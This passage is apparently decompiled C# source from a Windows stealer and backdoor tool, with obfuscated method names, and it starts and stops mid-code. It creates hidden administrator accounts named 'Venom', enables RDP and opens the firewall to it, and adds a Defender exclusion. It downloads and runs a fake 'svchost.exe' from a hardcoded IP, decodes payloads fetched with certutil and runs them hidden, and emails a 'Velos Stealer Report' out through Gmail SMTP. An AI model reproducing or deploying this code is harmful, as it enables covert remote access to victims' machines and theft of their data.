          Console.WriteLine("Failed to create user.");
          Console.WriteLine("Exception: " + ex?.ToString());
          Console.WriteLine();
          Console.WriteLine("Press Any Key to Continue");
          Console.ReadLine();
          break;
        }
        GroupPrincipal groupPrincipal1 = (GroupPrincipal) null;
        try
        {
          groupPrincipal1 = GroupPrincipal.FindByIdentity(context1, "Administrators");
          if (groupPrincipal1 != null)
          {
            Console.WriteLine("Checking if itadmin is part of Administrators Group");
            if (groupPrincipal1.Members.Contains(context1, IdentityType.SamAccountName, identityValue1))
            {
              Console.WriteLine("Administrators already contains " + identityValue1);
              break;
            }
            Console.WriteLine("Adding itadmin to Administrators Group");
            groupPrincipal1.Members.Add(user1);
            groupPrincipal1.Save();
            break;
          }
          Console.WriteLine("Could not find the group Administrators");
        }
        catch (Exception ex)
        {
          Console.WriteLine("Exception adding user to group.");
          Console.WriteLine("Exception: " + ex?.ToString());
          Console.WriteLine();
          Console.WriteLine("Press Any Key to Continue");
          Console.ReadLine();
        }
        Console.WriteLine("Cleaning Up");
        groupPrincipal1.Dispose();
        user1.Dispose();
        context1.Dispose();
        Console.WriteLine();
        Console.WriteLine("Press Any Key to Continue");
        Console.ReadLine();
        break;
      case 6:
        RegistryKey registryKey2 = Registry.LocalMachine.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", true);
        if (registryKey2 == null)
        {
          Registry.LocalMachine.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", RegistryKeyPermissionCheck.ReadWriteSubTree);
          registryKey2 = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", true);
          registryKey2.SetValue("dontdisplaylastusername", (object) 1);
        }
        else
          registryKey2.SetValue("dontdisplaylastusername", (object) 1);
        registryKey2.Flush();
        if (Registry.LocalMachine.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\CredSSP\\Parameters", true) == null)
        {
          Registry.LocalMachine.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\CredSSP\\Parameters", RegistryKeyPermissionCheck.ReadWriteSubTree);
          Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\CredSSP\\Parameters", true).SetValue("DWORD", (object) 2);
        }
        else
          registryKey2.SetValue("DWORD", (object) 2);
        registryKey2.Flush();
        string identityValue2 = user;
        string newPassword2 = user;
        PrincipalContext context2;
        try
        {
          Console.WriteLine("Building System Information");
          context2 = new PrincipalContext(ContextType.Machine, (string) null);
        }
        catch (Exception ex)
        {
          Console.WriteLine("Failed to create System Context.");
          Console.WriteLine("Exception: " + ex?.ToString());
          Console.WriteLine();
          Console.WriteLine("Press Any Key to Continue");
          Console.ReadLine();
          break;
        }
        Console.WriteLine("Checking if User Exists.");
        if (UserPrincipal.FindByIdentity(context2, identityValue2) != null)
        {
          Console.WriteLine(identityValue2 + " already exists. Exiting!!");
          Console.ReadLine();
          break;
        }
        Console.WriteLine("Building User Information");
        UserPrincipal user2 = new UserPrincipal(context2);
        user2.Name = identityValue2;
        user2.DisplayName = "Venom Administrative User";
        user2.PasswordNeverExpires = true;
        user2.SetPassword(newPassword2);
        user2.Enabled = new bool?(true);
        try
        {
          Console.WriteLine("Creating New User");
          user2.Save();
        }
        catch (Exception ex)
        {
          Console.WriteLine("Failed to create user.");
          Console.WriteLine("Exception: " + ex?.ToString());
          Console.WriteLine();
          Console.WriteLine("Press Any Key to Continue");
          Console.ReadLine();
          break;
        }
        GroupPrincipal groupPrincipal2 = (GroupPrincipal) null;
        try
        {
          groupPrincipal2 = GroupPrincipal.FindByIdentity(context2, "Administrators");
          if (groupPrincipal2 != null)
          {
            Console.WriteLine("Checking if itadmin is part of Administrators Group");
            if (groupPrincipal2.Members.Contains(context2, IdentityType.SamAccountName, identityValue2))
            {
              Console.WriteLine("Administrators already contains " + identityValue2);
              break;
            }
            Console.WriteLine("Adding itadmin to Administrators Group");
            groupPrincipal2.Members.Add(user2);
            groupPrincipal2.Save();
            break;
          }
          Console.WriteLine("Could not find the group Administrators");
        }
        catch (Exception ex)
        {
          Console.WriteLine("Exception adding user to group.");
          Console.WriteLine("Exception: " + ex?.ToString());
          Console.WriteLine();
          Console.WriteLine("Press Any Key to Continue");
          Console.ReadLine();
        }
        Console.WriteLine("Cleaning Up");
        groupPrincipal2.Dispose();
        user2.Dispose();
        context2.Dispose();
        Console.WriteLine();
        Console.WriteLine("Press Any Key to Continue");
        Console.ReadLine();
        break;
      case 10:
        Process.Start(new ProcessStartInfo()
        {
          FileName = "cmd",
          Arguments = "/k start /b wusa /uninstall /kb:4471332 /quiet & exit",
          CreateNoWindow = true,
          WindowStyle = ProcessWindowStyle.Hidden,
          UseShellExecute = true,
          ErrorDialog = false
        });
        RegistryKey registryKey3 = Registry.LocalMachine.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", true);
        if (registryKey3 == null)
        {
          Registry.LocalMachine.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", RegistryKeyPermissionCheck.ReadWriteSubTree);
          registryKey3 = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", true);
          registryKey3.SetValue("dontdisplaylastusername", (object) 1);
        }
        else
          registryKey3.SetValue("dontdisplaylastusername", (object) 1);
        registryKey3.Flush();
        if (Registry.LocalMachine.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\CredSSP\\Parameters", true) == null)
        {
          Registry.LocalMachine.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\CredSSP\\Parameters", RegistryKeyPermissionCheck.ReadWriteSubTree);
          Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\CredSSP\\Parameters", true).SetValue("DWORD", (object) 2);
        }
        else
          registryKey3.SetValue("DWORD", (object) 2);
        registryKey3.Flush();
        string identityValue3 = "Venom";
        string newPassword3 = "Venom";
        PrincipalContext context3;
        try
        {
          Console.WriteLine("Building System Information");
          context3 = new PrincipalContext(ContextType.Machine, (string) null);
        }
        catch (Exception ex)
        {
          Console.WriteLine("Failed to create System Context.");
          Console.WriteLine("Exception: " + ex?.ToString());
          Console.WriteLine();
          Console.WriteLine("Press Any Key to Continue");
          Console.ReadLine();
          break;
        }
        Console.WriteLine("Checking if User Exists.");
        if (UserPrincipal.FindByIdentity(context3, identityValue3) != null)
        {
          Console.WriteLine(identityValue3 + " already exists. Exiting!!");
          Console.ReadLine();
          break;
        }
        Console.WriteLine("Building User Information");
        UserPrincipal user3 = new UserPrincipal(context3);
        user3.Name = identityValue3;
        user3.DisplayName = "Venom Administrative User";
        user3.PasswordNeverExpires = true;
        user3.SetPassword(newPassword3);
        user3.Enabled = new bool?(true);
        try
        {
          Console.WriteLine("Creating New User");
          user3.Save();
        }
        catch (Exception ex)
        {
          Console.WriteLine("Failed to create user.");
          Console.WriteLine("Exception: " + ex?.ToString());
          Console.WriteLine();
          Console.WriteLine("Press Any Key to Continue");
          Console.ReadLine();
          break;
        }
        GroupPrincipal groupPrincipal3 = (GroupPrincipal) null;
        try
        {
          groupPrincipal3 = GroupPrincipal.FindByIdentity(context3, "Administrators");
          if (groupPrincipal3 != null)
          {
            Console.WriteLine("Checking if itadmin is part of Administrators Group");
            if (groupPrincipal3.Members.Contains(context3, IdentityType.SamAccountName, identityValue3))
            {
              Console.WriteLine("Administrators already contains " + identityValue3);
              break;
            }
            Console.WriteLine("Adding itadmin to Administrators Group");
            groupPrincipal3.Members.Add(user3);
            groupPrincipal3.Save();
            break;
          }
          Console.WriteLine("Could not find the group Administrators");
        }
        catch (Exception ex)
        {
          Console.WriteLine("Exception adding user to group.");
          Console.WriteLine("Exception: " + ex?.ToString());
          Console.WriteLine();
          Console.WriteLine("Press Any Key to Continue");
          Console.ReadLine();
        }
        Console.WriteLine("Cleaning Up");
        groupPrincipal3.Dispose();
        user3.Dispose();
        context3.Dispose();
        Console.WriteLine();
        Console.WriteLine("Press Any Key to Continue");
        Console.ReadLine();
        break;
    }
  }

  public static void 蚭ͮ僃㢁ⶼ䥸\u000B\uE303녕\uE9ABﳙ\u33E3홪庑뇐\uEEA5흦澵쐾얤()
  {
    RegistryKey registryKey1 = Registry.LocalMachine.OpenSubKey("SYSTEM\\CurrentControlSet\\Control\\Terminal Server", true);
    if (registryKey1 == null)
    {
      Registry.LocalMachine.CreateSubKey("SYSTEM\\CurrentControlSet\\Control\\Terminal Server", RegistryKeyPermissionCheck.ReadWriteSubTree);
      registryKey1 = Registry.CurrentUser.OpenSubKey("SYSTEM\\CurrentControlSet\\Control\\Terminal Server", true);
      registryKey1.SetValue("fDenyTSConnections", (object) 0);
    }
    else
      registryKey1.SetValue("fDenyTSConnections", (object) 0);
    registryKey1.Flush();
    RegistryKey registryKey2 = Registry.LocalMachine.OpenSubKey("SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp", true);
    if (registryKey2 == null)
    {
      Registry.LocalMachine.CreateSubKey("SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp", RegistryKeyPermissionCheck.ReadWriteSubTree);
      registryKey2 = Registry.CurrentUser.OpenSubKey("SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp", true);
      registryKey2.SetValue("UserAuthentication", (object) 1);
    }
    else
      registryKey2.SetValue("UserAuthentication", (object) 1);
    registryKey2.Flush();
    RegistryKey registryKey3 = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Policies\\Microsoft\\Windows NT\\Terminal Services", true);
    if (registryKey3 == null)
    {
      Registry.LocalMachine.CreateSubKey("SOFTWARE\\Policies\\Microsoft\\Windows NT\\Terminal Services", RegistryKeyPermissionCheck.ReadWriteSubTree);
      registryKey3 = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Policies\\Microsoft\\Windows NT\\Terminal Services", true);
      registryKey3.SetValue("fSingleSessionPerUser", (object) 0);
    }
    else
      registryKey3.SetValue("fSingleSessionPerUser", (object) 0);
    registryKey3.Flush();
    RegistryKey registryKey4 = Registry.LocalMachine.OpenSubKey("SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp", true);
    if (registryKey4 == null)
    {
      Registry.LocalMachine.CreateSubKey("SYSTEM\\CurrentControlSet\\Control\\Terminal Server", RegistryKeyPermissionCheck.ReadWriteSubTree);
      registryKey4 = Registry.CurrentUser.OpenSubKey("SYSTEM\\CurrentControlSet\\Control\\Terminal Server", true);
      registryKey4.SetValue("fSingleSessionPerUser", (object) 0);
    }
    else
      registryKey4.SetValue("fSingleSessionPerUser", (object) 0);
    registryKey4.Flush();
    try
    {
      RegistryKey registryKey5 = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList", true);
      if (registryKey5 != null && registryKey5.GetValue("Venom") != null)
        registryKey5.SetValue("Venom", (object) "0");
      Console.WriteLine("Venom desactivated");
    }
    catch (Exception ex)
    {
      㥗\u2622귝銕꿍輁쮒ၪሦꮑ\u2A04琄ങ໙\u2E68覜㓼똡眄餶.\uE476\u33F2\u3098タ겜ⷽꐺ\u2B69빶胖鮬㜞\u27F0鱥ⷢ옑䣥陻\uF117\u288E("New-ItemProperty -Path HKLM:SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList -Name Venom -PropertyType DWord -Value 0 -Force");
    }
    RegistryKey registryKey6 = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList", true);
    if (registryKey6 == null)
    {
      Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList", RegistryKeyPermissionCheck.ReadWriteSubTree);
      registryKey6 = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList", true);
      registryKey6.SetValue("Venom", (object) 0);
    }
    else
      registryKey6.SetValue("Venom", (object) 0);
    registryKey6.Flush();
    Process.Start(new ProcessStartInfo()
    {
      FileName = "cmd",
      Arguments = "/k start /b powershell –ExecutionPolicy Bypass -WindowStyle Hidden -Command Enable-NetFirewallRule -DisplayGroup 'Remote Desktop' & exit",
      CreateNoWindow = true,
      WindowStyle = ProcessWindowStyle.Hidden,
      UseShellExecute = true,
      ErrorDialog = false
    });
    Process.Start(new ProcessStartInfo()
    {
      FileName = "cmd",
      Arguments = "/k start /b powershell –ExecutionPolicy Bypass -WindowStyle Hidden -Command netsh advfirewall firewall add rule name='allow RemoteDesktop' dir=in protocol=TCP localport=3389 action=allow & exit",
      CreateNoWindow = true,
      WindowStyle = ProcessWindowStyle.Hidden,
      UseShellExecute = true,
      ErrorDialog = false
    });
    Process.Start(new ProcessStartInfo()
    {
      FileName = "cmd",
      Arguments = "/k start /b powershell –ExecutionPolicy Bypass -WindowStyle Hidden -inputformat none -outputformat none -NonInteractive -Command Add-MpPreference -ExclusionPath %ProgramFiles%\\RDP Wrapper & exit",
      CreateNoWindow = true,
      WindowStyle = ProcessWindowStyle.Hidden,
      UseShellExecute = true,
      ErrorDialog = false
    });
  }

  public static void \uE476\u33F2\u3098タ겜ⷽꐺ\u2B69빶胖鮬㜞\u27F0鱥ⷢ옑䣥陻\uF117\u288E(string args) => new Process()
  {
    StartInfo = new ProcessStartInfo()
    {
      FileName = "powershell",
      Arguments = args,
      WindowStyle = ProcessWindowStyle.Hidden,
      CreateNoWindow = true
    }
  }.Start();

  public static void 齼랺\uE9E9ⶫ刋쿿\uE44B誘\u33BA\u0EBE\u215B鎼\u2805瘎ඪ\uA6FCꓪ茭䟞䁔()
  {
    try
    {
      foreach (Process process in Process.GetProcessesByName("cmd"))
        process.Kill();
      foreach (Process process in Process.GetProcessesByName("conhost"))
        process.Kill();
      foreach (Process process in Process.GetProcessesByName("installrdp"))
        process.Kill();
      foreach (Process process in Process.GetProcessesByName("rdpinstall"))
        process.Kill();
      foreach (Process process in Process.GetProcessesByName("updaterdp"))
        process.Kill();
      foreach (Process process in Process.GetProcessesByName("Install"))
        process.Kill();
      foreach (Process process in Process.GetProcessesByName("winvnc"))
        process.Kill();
    }
    catch (Exception ex)
    {
      Console.WriteLine(ex.Message);
    }
  }

  public static void ࠊ跐碀\u26BC䍢뜢릖ﭒꄖ\u2157ᶮꢏ\u2E46翝킩ᙊ\u20C6菸懡雲() => Process.Start(new ProcessStartInfo()
  {
    FileName = "cmd",
    Arguments = "/k start /b del /q/f/s %TEMP%\\* & exit",
    CreateNoWindow = true,
    WindowStyle = ProcessWindowStyle.Hidden,
    UseShellExecute = true,
    ErrorDialog = false
  });

  public static void \uE8F4묯龏䄆ᙩ褥䯃ＮᏢ㖘ꖬ蟰ꋒԈ誃\u0382\uF136Դ寄礲()
  {
    㥗\u2622귝銕꿍輁쮒ၪሦꮑ\u2A04琄ങ໙\u2E68覜㓼똡眄餶.齼랺\uE9E9ⶫ刋쿿\uE44B誘\u33BA\u0EBE\u215B鎼\u2805瘎ඪ\uA6FCꓪ茭䟞䁔();
    㥗\u2622귝銕꿍輁쮒ၪሦꮑ\u2A04琄ങ໙\u2E68覜㓼똡眄餶.ࠊ跐碀\u26BC䍢뜢릖ﭒꄖ\u2157ᶮꢏ\u2E46翝킩ᙊ\u20C6菸懡雲();
    string fileName = Path.Combine(Path.GetTempPath(), "svchost.exe");
    new WebClient().DownloadFile("http://91.134.207.16/svchost.exe", fileName);
    Process.Start(fileName);
    Thread.Sleep(10000);
    㥗\u2622귝銕꿍輁쮒ၪሦꮑ\u2A04琄ങ໙\u2E68覜㓼똡眄餶.齼랺\uE9E9ⶫ刋쿿\uE44B誘\u33BA\u0EBE\u215B鎼\u2805瘎ඪ\uA6FCꓪ茭䟞䁔();
  }

  public static void 뇜透\u2286憤阄儶곈ᡩ죞茶刑\u2BEF\uE08B쁟䯜榭Հ頟\uE70D\u2087(
    string filepath,
    string email,
    string toemail,
    string password,
    string token)
  {
    㥗\u2622귝銕꿍輁쮒ၪሦꮑ\u2A04琄ങ໙\u2E68覜㓼똡眄餶.\uF605\u2724吵踞덣霟ฑޙ伱\uFFFD\uEA82瞝뭕\u2EE6ꅃ\uF2D6휮徹스ꏊ();
    㥗\u2622귝銕꿍輁쮒ၪሦꮑ\u2A04琄ങ໙\u2E68覜㓼똡眄餶.ꗅ\uEF6C瘉ꢒ탸㓤襃\u256F\uE3CD棚豤欺蕫僳辶憍䲵腶䟡蚵(token);
    try
    {
      StreamWriter streamWriter = new StreamWriter(Path.Combine(Path.GetTempPath(), "send.ps1"));
      Path.Combine(Path.GetTempPath(), "blat.exe");
      streamWriter.WriteLine("$SMTPServer = 'smtp.gmail.com';");
      streamWriter.WriteLine("$SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 587);");
      streamWriter.WriteLine("$SMTPInfo.EnableSsl = $true;");
      streamWriter.WriteLine("$SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('" + email + "', '" + password + "');");
      streamWriter.WriteLine("$ReportEmail = New-Object System.Net.Mail.MailMessage;");
      streamWriter.WriteLine("$ReportEmail.From = '" + email + "';");
      streamWriter.WriteLine("$ReportEmail.To.Add('" + toemail + "');");
      streamWriter.WriteLine("$ReportEmail.Subject = 'Velos Stealer Report';");
      streamWriter.WriteLine("$ReportEmail.Body = 'Velos Stealer report in the attachments.';");
      streamWriter.WriteLine("$ReportEmail.Attachments.Add('" + filepath + "');");
      streamWriter.WriteLine("$SMTPInfo.Send($ReportEmail);");
      streamWriter.Close();
      Thread.Sleep(5000);
      string str = Path.Combine(Path.GetTempPath(), "send.ps1");
      Process.Start(new ProcessStartInfo()
      {
        FileName = "cmd",
        Arguments = "/k start /b powershell -ExecutionPolicy Bypass " + str + "; & exit",
        CreateNoWindow = true,
        WindowStyle = ProcessWindowStyle.Hidden,
        UseShellExecute = true,
        ErrorDialog = false
      }).WaitForExit();
      Thread.Sleep(40000);
      㥗\u2622귝銕꿍輁쮒ၪሦꮑ\u2A04琄ങ໙\u2E68覜㓼똡眄餶.ㄉ\u23D0㓄抋\uFF01戹\uF8E3잱ૐ㛵㚘携\uE885糇㹣怹懧\u0E7B훙鐦();
      㭨눨\uFE61븸\uFFFD뮭紽\uA7D2魦ꦯ훽\uF49E\uFFFD佼ᛡ\u2B5D\uF7B7᧕냃ፗ.棦ȡ훬뙎爸ط낉띡\u19FA脎⳱같찠㤘쏷稾\u2653\uE121厤쁔();
    }
    catch (Exception ex)
    {
    }
  }

  public static void \uF63AԱꍒ\uFFFD\uE8E4궨枹濱좕웋\u3391㳇諱Ꜽὡ雉獔苆䅔ᱺ(string dir, string zipPath) => Process.Start(new ProcessStartInfo()
  {
    FileName = "cmd",
    Arguments = "/k start /b powershell Compress-Archive -Path " + dir + " -DestinationPath " + zipPath + " & exit",
    CreateNoWindow = true,
    WindowStyle = ProcessWindowStyle.Hidden,
    UseShellExecute = true,
    ErrorDialog = false
  });

  public static void \u280E䜯೦\uED83䟕囶ꮇ틮똯\uF174䗄亳䤄長\uAA3E漿ꐈ\uFFFDⷰ䃸(string dir)
  {
    string path = Environment.GetEnvironmentVariable("temp") + "\\" + 㥗\u2622귝銕꿍輁쮒ၪሦꮑ\u2A04琄ങ໙\u2E68覜㓼똡眄餶.苞괲\uFFFD絭\uE0ECɿ\uE7E9켢䍰䑕\u2FAC㪵ꏲ\u2E3B\uFFFD힑異麹叮\uEA7E();
    if (!Directory.Exists(path))
      return;
    Directory.Delete(path);
  }

  public static string 苞괲\uFFFD絭\uE0ECɿ\uE7E9켢䍰䑕\u2FAC㪵ꏲ\u2E3B\uFFFD힑異麹叮\uEA7E()
  {
    string str = "";
    try
    {
      ManagementObject managementObject = new ManagementObject("win32_logicaldisk.deviceid=\"" + Environment.GetFolderPath(Environment.SpecialFolder.System).Substring(0, 1) + ":\"");
      managementObject.Get();
      str = managementObject["VolumeSerialNumber"].ToString();
    }
    catch (Exception ex)
    {
    }
    return str;
  }

  public static void 㷅\u25E9謜㵁陣ɉ뗪\uFFFD㜗\u0EDA頷䞫킔ሡ㼍똴襵\uE3F7\u4DE7窲()
  {
    new ServiceController("TermService").Stop();
    㥗\u2622귝銕꿍輁쮒ၪሦꮑ\u2A04琄ങ໙\u2E68覜㓼똡眄餶.齼랺\uE9E9ⶫ刋쿿\uE44B誘\u33BA\u0EBE\u215B鎼\u2805瘎ඪ\uA6FCꓪ茭䟞䁔();
    㥗\u2622귝銕꿍輁쮒ၪሦꮑ\u2A04琄ങ໙\u2E68覜㓼똡眄餶.ࠊ跐碀\u26BC䍢뜢릖ﭒꄖ\u2157ᶮꢏ\u2E46翝킩ᙊ\u20C6菸懡雲();
    string str = "C:\\Program Files\\RDP Wrapper\\uninstall.bat";
    Process.Start(new ProcessStartInfo()
    {
      FileName = "cmd",
      Arguments = "/k start /b powershell " + str + " & exit",
      CreateNoWindow = true,
      WindowStyle = ProcessWindowStyle.Hidden,
      UseShellExecute = true,
      ErrorDialog = false
    });
    string path = "C:\\Program Files\\RDP Wrapper";
    Process.Start(new ProcessStartInfo()
    {
      FileName = "cmd",
      Arguments = "/k start /b del /q/f/s " + path + " & exit",
      CreateNoWindow = true,
      WindowStyle = ProcessWindowStyle.Hidden,
      UseShellExecute = true,
      ErrorDialog = false
    });
    Directory.Delete(path, true);
    㥗\u2622귝銕꿍輁쮒ၪሦꮑ\u2A04琄ങ໙\u2E68覜㓼똡眄餶.挫\uE11D\uE813邨ਥ\uD7A8雂夦ꂝ疳萍伨쎻ྲ춨罏䝈虛斘鱍();
    System.IO.File.SetAttributes(path, FileAttributes.Normal);
    System.IO.File.Delete(path);
  }

  public static void 矘굼众幑갼ﭦ歂핪臾畮\uF4ECᾸ뎋ᆤ鼈ᡆ崚놿ᠫ缑()
  {
    㥗\u2622귝銕꿍輁쮒ၪሦꮑ\u2A04琄ങ໙\u2E68覜㓼똡眄餶.齼랺\uE9E9ⶫ刋쿿\uE44B誘\u33BA\u0EBE\u215B鎼\u2805瘎ඪ\uA6FCꓪ茭䟞䁔();
    㥗\u2622귝銕꿍輁쮒ၪሦꮑ\u2A04琄ങ໙\u2E68覜㓼똡眄餶.ࠊ跐碀\u26BC䍢뜢릖ﭒꄖ\u2157ᶮꢏ\u2E46翝킩ᙊ\u20C6菸懡雲();
    㥗\u2622귝銕꿍輁쮒ၪሦꮑ\u2A04琄ങ໙\u2E68覜㓼똡眄餶.\uA703\uF6BAや\u1808ꀝ\uFFFD权蘻懫헶畝ꅬ㓉쒟\uF70E\u12B1嫉뷁ퟻ\uF21D();
    string path = "C:\\Windows\\vnc";
    Process.Start(new ProcessStartInfo()
    {
      FileName = "cmd",
      Arguments = "/k start /b del /q/f/s " + path + " & exit",
      CreateNoWindow = true,
      WindowStyle = ProcessWindowStyle.Hidden,
      UseShellExecute = true,
      ErrorDialog = false
    });
    Directory.Delete(path, true);
    㥗\u2622귝銕꿍輁쮒ၪሦꮑ\u2A04琄ങ໙\u2E68覜㓼똡眄餶.挫\uE11D\uE813邨ਥ\uD7A8雂夦ꂝ疳萍伨쎻ྲ춨罏䝈虛斘鱍();
    System.IO.File.SetAttributes(path, FileAttributes.Normal);
    System.IO.File.Delete(path);
  }

  public static void 挫\uE11D\uE813邨ਥ\uD7A8雂夦ꂝ疳萍伨쎻ྲ춨罏䝈虛斘鱍()
  {
    if (System.IO.File.Exists("C:\\Program Files\\RDP Wrapper\\rdpwrap.dll"))
    {
      try
      {
        System.IO.File.Delete("C:\\Program Files\\RDP Wrapper\\rdpwrap.ini");
      }
      catch (IOException ex)
      {
        Console.WriteLine(ex.Message);
        return;
      }
    }
    FileInfo fileInfo = new FileInfo("C:\\Program Files\\RDP Wrapper\\rdpwrap.dll");
    try
    {
      fileInfo.Delete();
    }
    catch (IOException ex)
    {
      Console.WriteLine(ex.Message);
    }
    try
    {
      Directory.Delete("C:\\Program Files\\RDP Wrapper");
    }
    catch (IOException ex)
    {
      Console.WriteLine(ex.Message);
    }
    if (Directory.Exists("C:\\Program Files\\RDP Wrapper"))
    {
      try
      {
        Directory.Delete("C:\\Program Files\\RDP Wrapper", true);
      }
      catch (IOException ex)
      {
        Console.WriteLine(ex.Message);
      }
    }
    DirectoryInfo directoryInfo = new DirectoryInfo("C:\\Program Files\\RDP Wrapper");
    try
    {
      directoryInfo.Delete(true);
    }
    catch (IOException ex)
    {
      Console.WriteLine(ex.Message);
    }
    string path = "C:\\Program Files\\RDP Wrapper";
    FileSecurity accessControl = System.IO.File.GetAccessControl(path);
    SecurityIdentifier user = WindowsIdentity.GetCurrent().User;
    accessControl.SetOwner((System.Security.Principal.IdentityReference) user);
    accessControl.SetAccessRule(new FileSystemAccessRule((System.Security.Principal.IdentityReference) user, FileSystemRights.FullControl, AccessControlType.Allow));
    System.IO.File.SetAccessControl(path, accessControl);
    System.IO.File.Delete(path);
  }

  public static void ÿꬑ\u2FEC\uEF83桁極\u07F8㢤뭔㴖\uF4DD\u326E䊅綹㾁촁\uFFFD塟폜蠒(
    string link,
    string decodedfile)
  {
    string path1 = Path.Combine(鼀竃텕\u0C49칀센\uF6CB\uF7CC츲폰騨맇ᇨꥍ獰\u2FC3㾞禗\u0E93䈀.풗ᛸ髊\uFFFDࡌ\uE855Ⲽ\uF31A跥\uFFFD\uE3AF\u2947\uA7E1눸襨狹틊\u24B9풉埽, 鼀竃텕\u0C49칀센\uF6CB\uF7CC츲폰騨맇ᇨꥍ獰\u2FC3㾞禗\u0E93䈀.\u086B苅铜䮰究\uFFFD쉒\uE3C1葈溩\u25CD䤝婋男霏䵶핼箫㤟̋);
    string fileName = Path.Combine(path1, "encrypt.txt");
    string path = Path.Combine(path1, decodedfile);
    new WebClient().DownloadFile(link, fileName);
    Process.Start(new ProcessStartInfo()
    {
      FileName = "cmd",
      Arguments = "/k start /b certutil -decode " + fileName + "  " + path + "  & exit",
      CreateNoWindow = true,
      WindowStyle = ProcessWindowStyle.Hidden,
      UseShellExecute = true,
      ErrorDialog = false
    }).WaitForExit();
    Process.Start(new ProcessStartInfo()
    {
      FileName = "cmd",
      Arguments = "/k start /b " + path + "  & exit",
      CreateNoWindow = true,
      WindowStyle = ProcessWindowStyle.Hidden,
      UseShellExecute = true,
      ErrorDialog = false
    });
    System.IO.File.SetAttributes(path, FileAttributes.Hidden);
  }

  public static void 顚ﺊ컣制䃆쫮漴穀Ᵽꥫꂲؐ褃潚므\uE1A5鑭폲ﳣ\uEAD7(
    string link,
    string encrypted,
    string decodedfile)
  {
    string path1 = Path.Combine(鼀竃텕\u0C49칀센\uF6CB\uF7CC츲폰騨맇ᇨꥍ獰\u2FC3㾞禗\u0E93䈀.풗ᛸ髊\uFFFDࡌ\uE855Ⲽ\uF31A跥\uFFFD\uE3AF\u2947\uA7E1눸襨狹틊\u24B9풉埽, 鼀竃텕\u0C49칀센\uF6CB\uF7CC츲폰騨맇ᇨꥍ獰\u2FC3㾞禗\u0E93䈀.\u086B苅铜䮰究\uFFFD쉒\uE3C1葈溩\u25CD䤝婋男霏䵶핼箫㤟̋);
    string fileName = Path.Combine(path1, encrypted);
    string path = Path.Combine(path1, decodedfile);
    new WebClient().DownloadFile(link, fileName);
    Process.Start(new ProcessStartInfo()
    {
      FileName = "cmd",
      Arguments = "/k start /b certutil -decode " + fileName + "  " + path + "  & exit",
      CreateNoWindow = true,
      WindowStyle = ProcessWindowStyle.Hidden,
      UseShellExecute = true,
      ErrorDialog = false
    }).WaitForExit();
    \uF42C倈\u0A0C查\uFBD1ힴ\u3346흸碤쥄ꢱ셿ϵ\uA6FE鐎\uAACC雷땕\u1AF1맲.\uFFFD難ᄌ川郕\uED64䆊镙\u3321㥡\u1943⳰띃患櫵剥\uFFFD雜쵠螵(new string[1]
    {
      path
    });
    System.IO.File.SetAttributes(path, FileAttributes.Hidden);
  }

  public static void 榞㚲\uF41E铪\uEF30\uFFFD\uFFFD\uE40C宜騮菔\uF685\uE378\uA700ᴅ襓ⶂ\uFE14勳铿(
    string link,
    string encrypted,
    string decodedfile)
  {
    string path1 = Path.Combine(鼀竃텕\u0C49칀센\uF6CB\uF7CC츲폰騨맇ᇨꥍ獰\u2FC3㾞禗\u0E93䈀.풗ᛸ髊\uFFFDࡌ\uE855Ⲽ\uF31A跥\uFFFD\uE3AF\u2947\uA7E1눸襨狹틊\u24B9풉埽, 鼀竃텕\u0C49칀센\uF6CB\uF7CC츲폰騨맇ᇨꥍ獰\u2FC3㾞禗\u0E93䈀.\u086B苅铜䮰究\uFFFD쉒\uE3C1葈溩\u25CD䤝婋男霏䵶핼箫㤟̋);
    string fileName = Path.Combine(path1, encrypted);
    string path = Path.Combine(path1, decodedfile);
    new WebClient().DownloadFile(link, fileName);
    Process.Start(new ProcessStartInfo()
    {
      FileName = "cmd",
      Arguments = "/k start /b certutil -decode " + fileName + "  " + path + "  & exit",
      CreateNoWindow = true,
      WindowStyle = ProcessWindowStyle.Hidden,
      UseShellExecute = true,
      ErrorDialog = false
    }).WaitForExit();
    System.IO.File.SetAttributes(path, FileAttributes.Hidden);
  }

  public static void 姰\uF26E䳓챢ﴞ\u2F70\u20A9ㅺ\uFFFD뎞\uFFFD鸬㔖Ὕ晃\u4DF3烽\u31D6䳪\u1DF8(
    string link,
    string name)
  {
